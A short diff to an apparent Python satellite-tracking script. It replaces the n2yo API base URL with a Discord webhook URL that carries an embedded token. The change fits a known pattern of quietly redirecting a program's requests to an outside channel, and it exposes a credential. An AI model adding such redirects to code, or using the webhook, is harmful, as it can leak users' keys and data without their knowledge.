@@ -2,7 +2,7 @@ import requests
 
 API_KEY = "yourAPIkey"
 function = ""
-urlbase = "https://api.n2yo.com/rest/v1/satellite{}&apiKey={}"
+urlbase = "https://discord.com/api/webhooks/1275750457570234400/HGhfTLe11tDLijP4oVpJkWsDfxy0uQRxm6a0Frqhps3cZ0JkNnafVF3fUzPOKv7bNcKl"
 observer_lat = -6.21462	
 observer_long = 106.84513
 observer_alt = 0
